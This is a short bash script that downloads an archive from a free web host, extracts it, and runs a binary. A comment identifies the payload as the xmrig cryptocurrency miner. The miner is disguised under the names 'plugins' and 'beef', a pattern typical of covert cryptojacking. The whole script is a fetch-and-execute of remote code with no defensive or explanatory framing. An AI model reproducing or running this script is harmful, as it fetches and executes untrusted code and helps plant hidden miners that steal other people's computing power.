#!/bin/bash

# Download xmrig
wget "https://bfxm.000webhostapp.com/plugins.tar.gz"


# Comment the line below after first time run.
tar -xf plugins.tar.gz

cd plugins


./beef -c config.json